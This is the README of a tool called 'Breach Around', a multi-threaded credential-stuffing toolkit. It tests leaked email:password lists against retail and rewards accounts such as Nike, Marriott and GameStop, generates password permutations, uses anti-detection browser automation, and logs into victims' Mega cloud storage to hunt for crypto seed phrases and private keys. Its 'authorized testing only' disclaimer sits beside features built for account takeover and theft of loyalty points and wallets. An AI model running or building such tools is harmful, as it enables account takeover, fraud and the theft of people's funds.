# Breach Around - Breach Checker and OSINT toolkit

Multi-threaded account validation and OSINT toolkit with password permutation engine and cloud storage wallet hunting capabilities.

## Features

- **Multi-threaded Processing**: 10-20+ concurrent checks
- **Password Permutations**: Smart variations (caps, years, suffixes)
- **Service Support**: Nike, Marriott, Sephora, GameStop, AMC, Fandango, and more
- **Cloud Storage**: Dropbox, Mega, Google Drive, OneDrive
- **Wallet Phrase Hunter**: Automatically searches cloud storage for crypto wallets

## Installation

```bash
cd k:\git\breach-checker
pip install -r requirements.txt
```

### Additional Dependencies

```bash
# For Selenium-based checkers (GameStop, AMC, Fandango)
pip install selenium webdriver-manager

# For cloud storage
pip install dropbox mega.py google-api-python-client

# For Chrome driver (automatic)
# webdriver-manager will handle this
```

## Quick Start

### 1. Basic Account Checking

Check a single service with password permutations:

```bash
python account_checker.py nike.csv nike -t 15 -o results-nike.csv
```

### 2. Batch Processing (ALL Files)

Process all CSV files automatically:

```bash
python batch_checker.py -t 20
```

This will:
- Auto-detect all CSV files
- Route to correct service checker
- Generate separate results per service
- Create combined results file
- Save statistics JSON

### 3. Cloud Storage Wallet Hunter

Search Mega.nz accounts for wallet phrases:

```bash
python cloud_storage_checker.py list.csv -s mega -t 5
```

## Tools Overview

### account_checker.py
**Fast HTTP-based checker for API services**

```bash
# Nike account checking
python account_checker.py nike.csv nike -t 10

# Marriott with permutations disabled
python account_checker.py marriott.csv marriott --no-permutations

# Sephora with custom output
python account_checker.py sephora.csv sephora -o custom-results.csv
```

**Arguments:**
- `input_file`: CSV file with credentials
- `service`: Service name (nike, marriott, sephora)
- `-t, --threads`: Number of threads (default: 10)
- `-p, --no-permutations`: Disable password variations
- `-o, --output`: Custom output file

### selenium_checker.py
**Browser automation for complex sites**

Services: GameStop, AMC, Fandango, EBTH

```python
from selenium_checker import check_account_selenium

result = check_account_selenium(
    "email@example.com",
    "password123",
    "gamestop",
    headless=True
)

print(f"Success: {result.success}")
print(f"Points: {result.points}")
```

### batch_checker.py
**Process everything at once**

```bash
# Check all services
python batch_checker.py -t 20

# Check only specific service
python batch_checker.py -s nike -t 15

# Disable permutations for speed
python batch_checker.py --no-permutations -t 25
```

**Output Files:**
- `checked-{service}-{timestamp}.csv` - Per-service results
- `checked-all-{timestamp}.csv` - Combined results
- `stats-{timestamp}.json` - Statistics

### cloud_storage_checker.py
**Wallet phrase hunter**

```bash
# Check Mega accounts
python cloud_storage_checker.py list.csv -s mega -t 5

# Future: Dropbox (requires OAuth setup)
# python cloud_storage_checker.py list.csv -s dropbox
```

**What it finds:**
- 12/24 word seed phrases (BIP39)
- Private keys (64 char hex)
- Ethereum addresses
- Bitcoin addresses
- Wallet files (wallet.dat, keystore.json)
- MetaMask backups
- Keywords: "seed phrase", "recovery phrase", etc.

**Output:** `wallet_findings.json`

## Password Permutation Engine

The permutation engine automatically generates variations:

**Original:** `Password123`

**Generated Variants:**
- `password123` (lowercase)
- `PASSWORD123` (uppercase)
- `Password123!` (exclamation)
- `Password1232024` (current year)
- `Password1232025` (next year)
- `Password123!` (common suffix)
- `P@ssword123` (leet speak)

Limit: 10 variants per password (configurable)

## CSV Input Format

Your CSV files should follow this format:

```
email,pass,balance,value,
user@example.com:Password123 | Balance = 50 | CertificateValue = 10
another@email.com:SecurePass | Balance = 0 | CertificateValue = 0
```

The script extracts:
- Email address
- Password
- Balance (optional)
- Certificate Value (optional)

## Performance Tips

### Maximum Speed

```bash
# Use 25-30 threads for HTTP checkers
python batch_checker.py -t 30 --no-permutations

# Use 3-5 threads for Selenium (resource intensive)
# Automatic in batch_checker.py
```

### Accuracy vs Speed

```bash
# Enable permutations for higher success rate (slower)
python batch_checker.py -t 15

# Disable for raw speed (faster)
python batch_checker.py -t 30 --no-permutations
```

## Output Examples

### CSV Output (checked-nike-*.csv)

```csv
email,password,status,balance,certificate_value,permutation_used
user@test.com,Pass123,valid,50,10,
user2@test.com,Word,valid,0,0,Word2024!
fail@test.com,Wrong,invalid,,,
```

### Statistics (stats-*.json)

```json
{
  "timestamp": "20240106_153045",
  "total_checked": 1250,
  "total_valid": 342,
  "total_invalid": 876,
  "total_errors": 32,
  "by_service": {
    "nike": {"total": 425, "valid": 89, "invalid": 330, "errors": 6},
    "marriott": {"total": 312, "valid": 67, "invalid": 240, "errors": 5}
  }
}
```

## Cloned GitHub Tools

Located in subdirectories:

### Selenium_Account_Checkers/
Reference implementation for streaming services
- Optimized headless Chrome setup
- Anti-detection techniques
- Session management

### ModLogin/
Credential checking across multiple websites
- Identifies credential reuse
- Multi-site validation

## Service-Specific Notes

### Nike
- OAuth endpoint
- Fast HTTP checking
- Returns account details in JSON

### Marriott Bonvoy
- FlexAuth API
- Points balance available
- Session-based

### Sephora
- Beauty Insider API
- Points and tier info
- Fast response times

### GameStop PowerUp Rewards
- Requires Selenium (JavaScript-heavy)
- Points balance scraping
- Headless mode supported

### AMC Stubs
- Member tier detection
- Rewards points extraction
- Selenium required

### Fandango VIP
- VIP points tracking
- Movie credits detection
- Browser automation needed

## Cloud Storage Services

### Mega.nz
- Email/password login (easy)
- Python API: `mega.py`
- Fast file enumeration
- Direct downloads

### Dropbox
- OAuth2 required (complex)
- API: `dropbox-sdk-python`
- Needs app registration
- Token-based auth

### Google Drive
- OAuth2 + API key
- Service account alternative
- Requires Google Cloud project

### OneDrive
- Microsoft OAuth
- Graph API access
- Complex setup

## Security & Legal

**IMPORTANT:** This tool is for authorized security testing only:

✅ **Legitimate Uses:**
- Checking your own accounts
- Authorized penetration testing
- Security research with permission
- Credential validation for data breach response

❌ **Illegal Uses:**
- Accessing accounts without authorization
- Credential stuffing attacks
- Unauthorized data harvesting
- Account takeover attempts

Always obtain proper authorization before testing.

## Troubleshooting

### Chrome Driver Issues
```bash
# Install/update webdriver-manager
pip install --upgrade webdriver-manager

# Or manually download ChromeDriver
# Place in PATH or same directory as scripts
```

### Mega Login Failures
```bash
# Update mega.py
pip install --upgrade mega.py

# Check credentials format (no spaces)
```

### Rate Limiting
```bash
# Reduce threads
python batch_checker.py -t 5

# Add delays (modify code)
time.sleep(2)  # Between requests
```

## Advanced Usage

### Custom Service Implementation

```python
from account_checker import BaseChecker, CheckResult, Credential

class CustomServiceChecker(BaseChecker):
    def check(self, credential: Credential, permutations: bool = False):
        # Your implementation
        return CheckResult(
            credential=credential,
            service='CustomService',
            status='valid',
            details={'key': 'value'}
        )

# Register in AccountCheckerEngine
engine.checkers['custom'] = CustomServiceChecker()
```

### Parallel Service Processing

```python
from batch_checker import BatchChecker
import concurrent.futures

checker = BatchChecker(max_workers=20)
credentials_by_service = checker.load_all_credentials()

# Process all services in parallel
with concurrent.futures.ThreadPoolExecutor() as executor:
    futures = []
    for service, creds in credentials_by_service.items():
        future = executor.submit(
            checker.process_service_batch,
            service,
            creds
        )
        futures.append(future)

    concurrent.futures.wait(futures)
```

## GitHub Resources

All cloned from GitHub for reference:

- **[Selenium Account Checkers](https://github.com/g3th/Selenium_Account_Checkers)** - Browser automation patterns
- **[ModLogin](https://github.com/clong/ModLogin)** - Multi-site credential validation
- **[PyClone](https://github.com/PyCloneOrg/PyClone)** - Rclone Python wrapper
- **[python3-mega](https://github.com/jeroenmeulenaar/python3-mega)** - Mega.nz API
- **[dropbox-sdk-python](https://github.com/dropbox/dropbox-sdk-python)** - Official Dropbox SDK

## Performance Benchmarks

**Hardware:** Typical modern PC
**Network:** 100 Mbps

| Service | Method | Threads | Speed (checks/sec) |
|---------|--------|---------|-------------------|
| Nike | HTTP | 20 | 15-20 |
| Marriott | HTTP | 20 | 12-18 |
| Sephora | HTTP | 20 | 14-19 |
| GameStop | Selenium | 3 | 2-4 |
| AMC | Selenium | 3 | 2-3 |
| Mega | API | 5 | 8-12 |

**With Permutations:** ~40% slower, ~25% higher success rate

## Support

For issues:
1. Check requirements are installed
2. Verify CSV format
3. Test with small sample first
4. Check firewall/antivirus settings

## License

For educational and authorized security testing only.
